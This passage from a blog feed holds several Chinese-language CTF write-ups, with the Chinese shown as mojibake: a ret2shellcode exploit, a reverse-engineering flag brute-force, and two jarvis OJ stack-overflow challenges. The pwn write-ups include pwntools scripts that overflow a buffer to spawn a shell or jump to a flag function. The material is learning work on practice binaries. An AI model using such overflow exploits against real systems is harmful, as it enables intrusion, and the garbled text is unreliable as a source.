string">"debug"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#è·å¾—shçš„å‘½ä»¤å¤šç§å¤šæ ·ï¼Œå¹¶ä¸”æœ‰ä¸åŒç³»ç»Ÿç‰ˆæœ¬çš„sh</span><span class="token comment" spellcheck="true">#shellcode = asm(shellcraft.execve("/bin/sh"))</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flatæ¨¡å—èƒ½å°†patternå­—ç¬¦ä¸²å’Œåœ°å€ç»“åˆå¹¶ä¸”è½¬ä¸ºå­—èŠ‚æ¨¡å¼</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2c13d7442.png" class="lazyload"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å†…å®¹æ¶‰åŠ context æ¨¡å¼è®¾ç½®ï¼Œasmæ¨¡å—ï¼Œshellcraftæ¨¡å—ï¼Œpatchæ“ä½œï¼Œreturn to shellcodeé¢˜å‹ï¼Œpwntools flatæ¨¡å—ã€‚</p><p>ä»Šå¤©å…ˆæ··åˆ°è¿™å„¿ã€‚ã€‚ã€‚æˆ‘çœŸèœğŸ˜­ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Re-10æœˆ22-shiyanbar-10000</title>
      <link href="/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/"/>
      <url>/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Re-10æœˆ22-shiyanbar-10000"><a href="#Re-10æœˆ22-shiyanbar-10000" class="headerlink" title="Re-10æœˆ22-shiyanbar-10000"></a>Re-10æœˆ22-shiyanbar-10000</h1><blockquote><p>emmmè®°å½•ä¸€ä¸‹å®éªŒå§é‡Œä¸€é“ç®€å•çš„é€†å‘ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ç§æ€ç»´æ–¹å¼ã€‚</p></blockquote><blockquote><p>æ‹¿åˆ°ä¸€ä¸ªexeæ–‡ä»¶,è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd6ebe22927.png" alt=""></p><p>å¯¹æ²¡é”™å°±æ˜¯ä¸€ä¸ªå–µå­—ï¼Œç„¶åè¾“å…¥å†…å®¹ï¼Œä¼šè¾“å‡ºwrongï¼Œå¯ä»¥çŒœæµ‹è¾“å…¥äº†æ­£ç¡®çš„å­—ç¬¦åä¼šè¾“å‡ºgoodã€‚</p></blockquote><h2 id="é™æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#é™æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="é™æ€åˆ†æç¨‹åºé€»è¾‘"></a>é™æ€åˆ†æç¨‹åºé€»è¾‘</h2><blockquote><p>ä»¤äººç»æœ›çš„æ˜¯ï¼Œida6.8å’Œida7.0å¯¹æ­¤ç¨‹åºmainå‡½æ•°åˆ†æçš„ä¼ªä»£ç å±…ç„¶ä¸åŒï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹7.0çš„ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd72ad9ac34.png" alt=""></p><p>ç®€å•åˆ†æå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œæ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥æŒ‰å­—èŠ‚ä¸0x80uè¿›è¡Œæˆ–æ“ä½œï¼Œå³æŒ‰ä½æˆ–ï¼Œç„¶åå¯¹å¤„ç†åçš„å†…å®¹è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œç„¶åå¾—å‡ºç»“æœã€‚ä¸Šå›¾ä¸­çš„v4åˆ°v16å®é™…ä¸Šéƒ½æ˜¯ä¸‹å›¾ä¸­çš„16è¿›åˆ¶è½¬ä¸ºæ•´å‹çš„å†…å®¹ï¼Œå› ä¸ºä¸€ä¸ªå­—èŠ‚å¯ä»¥è¡¨ç¤ºçš„æ•°å­—èŒƒå›´ä¸º-128åˆ°127ã€‚</p><p><img src="https://i.loli.net/2018/10/22/5bcd71a486530.png" alt=""></p><p>ç„¶åæˆ‘å°±è¦å‚»é€¼ğŸ˜­åœ°è¯´ï¼Œè¿™äº›å†…å®¹è‚¯å®šè·Ÿæ¯”è¾ƒæ˜¯æœ‰å…³ç³»çš„ã€‚</p><p>è¯•è¯•å°†0xe6ä¸0x80</p><p>æˆ‘ä»¬æ³¨æ„åˆ°<code>.text:004013F8</code>ä½ç½®çš„å‘½ä»¤æ˜¯å°†eaxä¸0xFFFFFF80ç›¸æˆ–ï¼Œä¸ºå•¥æˆ‘ä»¬çš„ä¼ªä»£ç ä¸­å´æ˜¯ä¸0x80uç›¸æˆ–å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬æ˜¯æŒ‰å­—èŠ‚æ¥è¿›è¡Œæˆ–æ“ä½œï¼Œæ‰€ä»¥0xFFFFFF80å‰é¢çš„ä¸‰ä¸ªå­—èŠ‚ä¹Ÿå°±æ²¡æœ‰äº†å¿…è¦ã€‚</p><p>å”‰å®åœ¨æ˜¯è¿™é¢˜ç›®é€»è¾‘å¤ªå«ç³Šä¸æ¸…ï¼ˆå¯èƒ½æ˜¯æˆ‘å¤ªèœâ”­â”®ï¹â”­â”®ï¼‰</p></blockquote><h2 id="åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ"><a href="#åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ" class="headerlink" title="åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ"></a>åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ</h2><blockquote><p>é€šè¿‡ollydbgæˆ‘ä»¬æ¥è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œé¦–å…ˆè½½å…¥ç¨‹åºï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd7825508d0.png" alt=""></p><p>ç„¶åæˆ‘ä»¬æ‰¾ä¸€ä¸‹â€å–µâ€ï¼Œå‡ºç°çš„ä½ç½®ï¼Œå¹¶ä¸”åœ¨æ‰¾åˆ°çš„å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°ä¸‹æ–­ç‚¹ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd78b3669b0.png" alt=""></p><p>ç„¶åè¿è¡Œï¼Œå¹¶ä¸”éšä¾¿è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd790b40671.png" class="lazyload"></p><p>æ ˆä¸­å‡ºç°äº†ä¸¤ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒçš„æ•°æ®ï¼Œåœ¨æ•°æ®çª—å£è·Ÿéšï¼Œå¯ä»¥å‘ç°s2ä¸º13ä¸ªå­—èŠ‚ï¼Œæ­£å¥½å¯¹åº”å‰é¢çš„é‚£13ä¸ªæ•°æ®</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd79f764ec2.png" class="lazyload"></p><p>ä½†æ˜¯å…‰é è¿™äº›ä¿¡æ¯æˆ‘ä»¬èƒ½æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„ç­”æ¡ˆå—ï¼Ÿæˆ‘ä»¬å¯ä»¥å¯¹s1è¿›è¡Œä¸€äº›æ“ä½œï¼Œä¹‹å‰è¾“å…¥çš„å­—ç¬¦ä¸²ä¸º<code>helloword æˆ–æ“ä½œå¤„ç†å==&gt; E8 E5 EC EC EF F7 EF F2 E4</code>ã€‚æˆ‘çœ‹ç½‘ä¸Šå¾ˆå¤šæ•™ç¨‹æ˜¯ç›´æ¥é€šè¿‡å¼‚æˆ–ï¼Œå°†s2å¼‚æˆ–0x80å¾—åˆ°ç»“æœï¼ˆè„‘æ´ï¼Ÿï¼Ÿï¼‰</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd7e34f2571.png" class="lazyload"></p><p>ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½é€šè¿‡å¼‚æˆ–æ“ä½œå¹¶ä¸”æ ¹æ®å·²çŸ¥æ¡ä»¶èƒ½å¤Ÿå¾—åˆ°æˆ–æ“ä½œçš„åŸæ“ä½œæ•°ï¼Œä½†æ˜¯æˆ‘å¯èƒ½å¤ªèœäº†ä¸æ±‚ç”šè§£ï¼Œåªèƒ½å†™ä¸ªè„šæœ¬æšä¸¾ä¸€ä¸‹flagå¥½äº†ï¼ˆæ ¹æ®idaæ ¹æœ¬éš¾ä»¥çœ‹å‡ºæ¥å¥½ä¸å¥½ğŸ˜­è¿˜æ˜¯å¤ªèœäº†ä¸èƒ½æ€ªida)ã€‚</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#</span>__Author__ <span class="token operator">=</span><span class="token string">"Yof3ng"</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> a <span class="token keyword">in</span> lists<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">|</span><span class="token number">0x80</span><span class="token operator">==</span>a<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd7ed7225ae.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ21-jarvis-level0</title>
      <link href="/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/"/>
      <url>/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ21-jarvis-level0"><a href="#Pwn-10æœˆ21-jarvis-level0" class="headerlink" title="Pwn-10æœˆ21-jarvis-level0"></a>Pwn-10æœˆ21-jarvis-level0</h1><blockquote><p>è¿™é¢˜æ˜¯è¡¥ä¸Šæ˜¨å¤©æ²¡å†™å®Œçš„ä¸€é¢˜ã€‚ã€‚ã€‚è™½ç„¶å¾ˆç®€å•ğŸ˜­ğŸ˜­</p></blockquote><h2 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h2><blockquote><p><code>file level0</code> and <code>checksec level0</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd13050ba5.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°è¿™ç§ç®€å•çš„pwné¢˜åŸºæœ¬ä¸å¼€ä¿æŠ¤æªæ–½ï¼Œä¸ç„¶èœé¸¡æˆ‘ä¹Ÿç©ä¸ä¸‹å»ã€‚ã€‚ã€‚</p></blockquote><h2 id="é™æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#é™æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="é™æ€åˆ†æç¨‹åºé€»è¾‘"></a>é™æ€åˆ†æç¨‹åºé€»è¾‘</h2><blockquote><p>ä¸€ç”¨IDA Proæ‰“å¼€ç¨‹åºæ–‡ä»¶çœ‹çœ‹mainå‡½æ•°å°±è„‘æ®‹åœ°çœ‹åˆ°äº†<code>return vulnerable_function()</code></p><p><img src="https://i.loli.net/2018/10/21/5bcbd173656cc.png" alt=""></p><p>è·Ÿç€å»è¿™ä¸ªå‡½æ•°çœ‹ä¸€çœ‹:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd20189ae1.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å®šä¹‰çš„bufç©ºé—´ä¸º0x80,è€Œèƒ½å¤Ÿç”¨readå‡½æ•°è¯»å–çš„ä¸º0x200ï¼Œèƒ½å¤Ÿé€ æˆæ ˆæº¢å‡ºï¼Œå¹¶ä¸”å®ç°å‡½æ•°åœ°å€è¦†ç›–ã€‚è€Œä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ªcallsystemå‡½æ•°ï¼Œç‚¹è¿›å»çœ‹çœ‹å¯ä»¥å‘ç°<code>system(&quot;/bin/sh&quot;)</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd2752027e.png" alt=""></p><p>é‚£ä¹ˆæ ¹æ®é™æ€åˆ†æå‡ºæ¥çš„ä¿¡æ¯å¤§æ¦‚å¯ä»¥ç¡®å®šï¼šé¦–å…ˆé€šè¿‡mainå‡½æ•°è¿”å›åˆ°vulnerable_functionå‡½æ•°ï¼Œç„¶åé€šè¿‡vulnerable_functionå‡½æ•°å°†æŸå¤„è¿”å›åœ°å€è¦†ç›–ä¸ºcallsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶ågetshellã€‚</p></blockquote><h2 id="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"></a>åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘</h2><blockquote><p>gdb è°ƒè¯•ä¸€ä¸‹level0ï¼Œå…ˆå•æ­¥æ‰§è¡Œåˆ°vulnerable_function()å‡½æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/21/5bcbd5dc96afe.png" alt=""></p><p>å…ˆè¿‡ä¸€éè¯¥å‡½æ•°ï¼Œç„¶åè®°å½•å…³é”®ä¿¡æ¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbd6954fadf.png" class="lazyload"></p><p>è®¡ç®—ä¸€ä¸‹è·ç¦»ï¼š<code>hex(0x7fffffffdfc0 + 8 - 0x7fffffffdf40) = 0x88</code>ï¼Œé‚£ä¸ºä»€ä¹ˆæ¯”å®šä¹‰çš„0x80è¦å¤š0x08çš„è·ç¦»å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ida proçš„<code>alt + k</code>å¿«æ·é”®æŸ¥çœ‹bufçš„æ ˆå¸§ï¼Œä¼šå‘ç°ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbd939b1a8b.png" class="lazyload"></p><p>é€šè¿‡gdbè°ƒè¯•é‡Œé¢çš„å¤šä¸ªå…³é”®ä¿¡æ¯å¯¹æ¯”ï¼Œå…¶å®å¤šå‡ºæ¥çš„0x08æ˜¯æ ˆåº•çš„å†…å®¹ï¼Œç»§ç»­ä¸‹ä¸€æ­¥ï¼Œå°±å¯ä»¥çœ‹åˆ°æœ€å¼€å§‹è¢«å‹å…¥æ ˆä¸­çš„è¿”å›åœ°å€è¢«ç½®æ ˆé¡¶ï¼Œå‡†å¤‡è¿”å›ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbda659d6b6.png" class="lazyload"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ expå•¦ğŸ˜„ã€‚</p></blockquote><h2 id="æ”»ç ´"><a href="#æ”»ç ´" class="headerlink" title="æ”»ç ´"></a>æ”»ç ´</h2><blockquote><p>é€šè¿‡ä¸Šé¢çš„é€»è¾‘æˆ‘ä»¬å¯ä»¥å†™å‡ºå¦‚ä¸‹expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level0"</span><span class="token punctuation">)</span>callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>padding <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> callsystem_addrio<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbdc2dbe46c.png" class="lazyload"></p><p>ç„¶åå°±getshellå•¦ğŸ˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ20-one-of-jarvis</title>
      <link href="/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/"/>
      <url>/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ20-jarvis-Tell-me-something"><a href="#Pwn-10æœˆ20-jarvis-Tell-me-something" class="headerlink" title="Pwn-10æœˆ20-jarvis-Tell_me_something"></a>Pwn-10æœˆ20-jarvis-Tell_me_something</h1><blockquote><p>ä»Šå¤©ç®€å•åœ°åšä¸€ä¸‹jarvis ojçš„ä¸¤é“é¢˜ï¼Œ<code>level0</code>å’Œ<code>Tell_me_something</code>.</p><p>PS:å‡Œæ™¨0:07  æ˜å¤©å†™level0ï¼Œå…¶å®ä¸¤é¢˜å·®ä¸å¤šçš„é€»è¾‘ï¼ŒæŒºç®€å•çš„ã€‚</p></blockquote><h2 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell_me_something"></a>Tell_me_something</h2><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>é¦–å…ˆï¼Œ<code>file gestbook</code>and<code>checksec guestbook</code>ï¼Œç®€å•åœ°çœ‹çœ‹æ–‡ä»¶ä¿¡æ¯å’Œä¿æŠ¤æªæ–½</p><p><img src="https://i.loli.net/2018/10/20/5bcb420ce98b7.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å®ƒæ˜¯æ²¡æœ‰è„±è¡£æœçš„ï¼Œç„¶åæ²¡æœ‰å¼€å¯ä¿æŠ¤æªæ–½ã€‚</p></blockquote><h3 id="é™æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#é™æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="é™æ€åˆ†æç¨‹åºé€»è¾‘"></a>é™æ€åˆ†æç¨‹åºé€»è¾‘</h3><blockquote><p>ç”¨IDA pro çœ‹ä¸€ä¸‹è¯¥ç¨‹åºçš„æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°mainå‡½æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb42684db9f.png" alt=""></p><p>F5å¤§æ³•ï¼Œçœ‹çœ‹ä¼ªä»£ç ï¼Œå¾ˆç®€å•å°±å¯ä»¥åˆ¤æ–­å‡ºæº¢å‡ºç‚¹ï¼Œå› ä¸ºreadå‡½æ•°å¯ä»¥å°†è¶…å‡º0x88å¤§å°çš„æ•°æ®è¯»å…¥æ ˆç©ºé—´ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb42f7dd043.png" alt=""></p><p>ç„¶åæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°good_gameå‡½æ•°é‡Œé¢æœ‰æˆ‘ä»¬è¦çš„å…³é”®ä¿¡æ¯ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb498c0b0c9.png" alt=""></p><p>é‚£ä¹ˆåˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šï¼Œæ˜¯é€šè¿‡æº¢å‡ºæ¥ä½¿ç¨‹åºè·³è½¬åˆ°good_gameå‡½æ•°ä»è€Œå¾—åˆ°flagã€‚</p></blockquote><h3 id="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"></a>åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘</h3><blockquote><p>é¦–å…ˆæ”¾linuxé‡Œé¢è·‘ä¸€è·‘ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb48a91dfc9.png" alt=""></p><p>ç¡®å®äº§ç”Ÿäº†æº¢å‡ºçš„é—®é¢˜ï¼Œç„¶åè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸‹linuxå¹³å°çš„ä¸€ä¸ªäºŒè¿›åˆ¶åˆ†æè½¯ä»¶ï¼Œradare2ï¼Œè¯´å®è¯è¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œè¿™ä¸ªè½¯ä»¶é›†æˆäº†å¾ˆå¤šå·¥å…·ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥è¿›è¡Œéƒ¨åˆ†åœ°åŠ¨æ€è°ƒè¯•ï¼ˆ<a href="https://xz.aliyun.com/t/1514/#toc-7" target="_blank" rel="noopener">radare2è¯¦ç»†æ•™ç¨‹</a>ï¼‰ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb495987b21.png" class="lazyload"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨gdbè°ƒè¯•ä¸€ä¸‹ï¼Œå…ˆæ„é€ ä¸€ä¸ª0x88é•¿åº¦çš„paddingè¾“å…¥ï¼Œå†çœ‹çœ‹æ ˆç©ºé—´ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4c838d5dd.png" class="lazyload"></p><p>å¯ä»¥çŸ¥é“å°†é•¿åº¦ä¸º0x88çš„paddingå¡«å……åˆ°æ ˆç©ºé—´ä¹‹åï¼Œè¿˜å¯ä»¥è¿›è¡Œè¦†ç›–ï¼Œå› ä¸ºå¯ä»¥è¯»å–æœ€å¤§0x100ï¼ˆ256ï¼‰å¤§å°çš„å­—ç¬¦ï¼Œè€Œebpæ ˆåº•å‡ºç•Œå°±æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°åœ°å€æœ‰ä»€ä¹ˆå…³é”®æ€§çš„æ“ä½œä¸¾åŠ¨ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4d6959622.png" class="lazyload"></p><p>è¿›è¡Œå•æ­¥æ‰§è¡Œæµ‹è¯•æŸ¥çœ‹è¯¥æº¢å‡ºç‚¹èƒ½å¤Ÿè¢«è¦†ç›–çš„åœ°å€æ˜¯å¦ä¼šè¢«è¿”å›ï¼Œå…ˆé‡æ–°æŸ¥çœ‹ä¸€ä¸‹è¯¥æ ˆä½ç½®å­˜å‚¨çš„å‡½æ•°åœ°å€ä¸ºå¤šå°‘ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4f4e7f83a.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°å­˜å‚¨çš„å‡½æ•°åœ°å€ä¸º0x7ffff7a3fa87ï¼Œåˆ°æ ˆä½ç½®å³å°†æ”¹å˜æ—¶ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥éªŒè¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4e0d8a46d.png" class="lazyload"></p><p>æ‰§è¡Œä¸‹ä¸€æ­¥ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4e84bc436.png" class="lazyload"></p><p>å†ä¸‹ä¸€æ­¥å°±å°†è¯¥å‡½æ•°åœ°å€æ”¾å…¥äº†RIPï¼Œä½œä¸ºä¸‹ä¸€æ­¥è¿è¡Œçš„å‡½æ•°æŒ‡ä»¤ï¼š<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4ed83e345.png" class="lazyload"></p><p>é‚£ä¹ˆåˆ°è¿™é‡Œå·²ç»æ˜ç™½å¯ä»¥è¿”å›è¯¥åœ°å€è¦†ç›–çš„å†…å®¹ï¼Œå†™expäº†ã€‚</p></blockquote><h3 id="æ”»ç ´"><a href="#æ”»ç ´" class="headerlink" title="æ”»ç ´"></a>æ”»ç ´</h3><blockquote><p>ç”¨0x88é•¿åº¦çš„å†…å®¹åšpaddingï¼Œç„¶åå°†good_gameçš„åœ°å€æ”¾åˆ°å°¾éƒ¨ï¼Œç„¶åæ‰§è¡Œå³å¯ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#exp.py</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn impor <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'guestbook'</span><span class="token punctuation">)</span>good_game_addr <span class="token operator">=</span> <span class="token number">0x400620</span>padding <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>good_game_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œç»“æœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcb5203a355b.png" class="lazyload"></p><p>å•Šæœ¬æ¥ä»Šå¤©æ‰“ç®—å†™ä¸¤é¢˜çš„åšå®¢ï¼Œçœ‹æ¥è¿™ç¯‡åªèƒ½æ°´äº†ï¼Œå¤ªæ™šäº†å…ˆç¡äº†ã€‚ğŸ˜­ğŸ˜­</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
